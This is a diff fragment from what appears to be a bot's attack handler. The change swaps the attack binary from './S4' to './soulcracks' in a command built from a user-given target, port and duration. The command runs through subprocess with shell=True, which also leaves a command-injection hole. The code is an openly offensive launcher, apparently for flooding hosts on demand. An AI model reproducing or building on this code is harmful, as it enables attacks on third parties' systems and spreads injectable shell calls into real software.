@@ -268,7 +268,7 @@ def handle_attack(message):
             )
 
             # Execute attack command
-            full_command = f"./S4 {target} {port} {attack_time} 100"
+            full_command = f"./soulcracks {target} {port} {attack_time} "
             subprocess.run(full_command, shell=True)
 
         else:
